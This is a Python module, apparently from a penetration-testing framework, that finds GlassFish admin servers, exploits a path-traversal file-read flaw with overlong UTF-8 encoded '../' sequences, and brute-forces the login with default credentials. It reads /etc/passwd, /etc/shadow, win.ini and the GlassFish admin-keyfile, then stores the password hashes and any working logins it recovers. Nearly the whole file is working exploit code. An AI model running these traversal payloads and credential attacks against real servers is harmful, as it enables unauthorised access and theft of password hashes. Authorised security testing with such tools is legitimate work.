import os.path

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds
from utils.parsers import *
from lib.httpscan.http import HTTP

creds = [
    'admin:adminadmin',
    'admin:admin',
    'admin:',
    'admin:glassfish',
    'glassfish:glassfish',
]

lfi_urls = {
    'linux': '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
    'windows': '/theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini',
}

class Module:
    name = 'Glassfish'
    description = 'Discover and exploit glassfish (bruteforce, LFI) [ports: 4848]'

    def run(self, target, args, useragent, proxy, timeout, safe):
        http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)

        Output.minor({'target': http.url(target['path']), 'message': '[%s] Running module...' % self.name})

        res = http.get(target['path'])

        if res != None and res['code'] in [200,401] and ('glassfish' in res['title'].lower() or 'glassfish' in res['server'].lower()):
            http_info = {
                'hostname': target['hostname'],
                'port': target['port'],
                'protocol': 'tcp',
                'service': 'http',
                'url': http.url(target['path']),
                'http': {
                    'path': target['path'],
                    'code': res['code'],
                    'server': res['server'],
                    'title': res['title'],
                    'content-type': res['content-type'],
                },
                'tags': ['glassfish']
            }
            DB.insert_http_url(http_info)

            form = None
            for f in res['forms']:
                if not 'name' in f:
                    continue

                if 'login' in f['name']:
                    form = f
                    break

            if form:
                Output.highlight({'target': http.url(target['path']), 'message': '[%s] Administration interface' % self.name})
            else:
                Output.highlight({'target': http.url(target['path']), 'message': '[%s] Glassfish webserver' % self.name})

            # Try to exploit the LFI
            for system, uri in lfi_urls.items():
                res = http.get(os.path.join(target['path'], uri))

                if not res['code'] in [200] and res['title'] == 'N/A':
                    continue

                vuln_info = {
                    'hostname': target['hostname'],
                    'port': target['port'],
                    'service': 'http',
                    'url': http.url(target['path']),
                    'name': 'Glassfish server LFI',
                    'description': 'Glassfish server %s vulnerable to local file inclusion vulnerabiliry' % http.url(target['path']),
                }
                DB.insert_vulnerability(vuln_info)

                Output.vuln({'target': http.url(target['path']), 'message': '[%s] Glassfish server - Local File Inclusion vulnerability' % self.name})

                # try to get the admin hash
                exploit_uri = "/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afdomains/domain1/config/admin-keyfile"
                res = http.get(os.path.join(target['path'], exploit_uri))
                if res and res["code"] in [200] and res["title"] == "N/A":
                    for line in res["html"].split("\n"):
                        line = line.strip()
                        items = line.split(";")
                        if len(items) < 3:
                            continue

                        cred_info = {
                            'hostname': target['hostname'],
                            'port': target['port'],
                            'service': 'http',
                            'url': http.url(os.path.join(target['path'], exploit_uri)),
                            'type': 'hash',
                            'username': items[0],
                            'format': 'unknown',
                            'hash': items[1],
                        }
                        DB.insert_credential(cred_info)
                        Output.highlight({'target': http.url(target['path']), 'message': '[%s] Glassfish username: %s hash: %s' % (self.name, items[0], items[1])})

                if system == 'linux':
                    # get /etc/passwd
                    passwd_uri = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
                    res = http.get(os.path.join(target['path'], passwd_uri))
                    if res and res["code"] in [200] and res["title"] == "N/A":
                        Output.highlight({'target': http.url(target['path']), 'message': '[%s] Glassfish LFI exploitation: dumping /etc/passwd hashes to database' % self.name})
                        for account in parse_unix_passwd(res["html"]):
                            cred_info = {
                                'hostname': target['hostname'],
                                'port': target['port'],
                                'service': 'http',
                                'url': http.url(os.path.join(target['path'], passwd_uri)),
                                'type': 'hash',
                                'username': account['username'],
                                'format': account['format'],
                                'hash': account['hash'],
                            }
                            DB.insert_credential(cred_info)

                    # get /etc/shadow
                    shadow_uri = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/shadow"
                    res = http.get(os.path.join(target['path'], shadow_uri))
                    if res and res["code"] in [200] and res["title"] == "N/A":
                        Output.highlight({'target': http.url(target['path']), 'message': '[%s] Glassfish LFI exploitation: dumping /etc/shadow hashes to database' % self.name})
                        for account in parse_unix_shadow(res["html"]):
                            cred_info = {
                                'hostname': target['hostname'],
                                'port': target['port'],
                                'service': 'http',
                                'url': http.url(os.path.join(target['path'], passwd_uri)),
                                'type': 'hash',
                                'username': account['username'],
                                'format': account['format'],
                                'hash': account['hash'],
                            }
                            DB.insert_credential(cred_info)


                break

            if form:
                if args['bruteforce']:
                    Output.highlight({'target': http.url(target['path']), 'message': '[%s] Starting bruteforce...' % self.name})
                    for cred in gen_bruteforce_creds(args['bruteforce'], creds):
                        username, password = cred.split(':')

                        # get a new page (to avoid bug if the precedent check succeeded
                        data = http.get(target['path'])

                        if not data:
                            continue

                        form = None
                        for f in data['forms']:
                            if not 'name' in f:
                                continue

                            if 'login' in f['name']:
                                form = f
                                break

                        if not form:
                            continue

                        for arg in form['args']:
                            if 'username' in arg.lower():
                                form['args'][arg] = username

                            if 'password' in arg.lower():
                                form['args'][arg] = password

                        res = http.send_form(target['path'], form, html=data['html'], cookies=data['cookies'])

                        after_auth_form = None
                        for f in res['forms']:
                            if not 'name' in f:
                                continue

                            if 'login' in f['name'].lower():
                                after_auth_form = f
                                break

                        if after_auth_form != None:
                            continue

                        Output.success({'target': http.url(target['path']), 'message': '[%s] Authentication success to Glassfish with login %s and password %s' % (self.name, username, password)})

                        cred_info = {
                            'hostname': target['hostname'],
                            'port': target['port'],
                            'service': 'http',
                            'url': http.url(target['path']),
                            'type': 'password',
                            'username': username,
                            'password': password,
                            'tags': ['glassfish'],
                        }
                        DB.insert_credential(cred_info)

                        vuln_info = {
                            'hostname': target['hostname'],
                            'port': target['port'],
                            'service': 'http',
                            'url': http.url(target['path']),
                            'name': 'Default or predictable credentials on Glassfish service',
                            'description': 'Glassfish %s possess the following default or weak credentials: %s:%s' % (http.url(target['path']), username, password),
                        }
                        DB.insert_vulnerability(vuln_info)



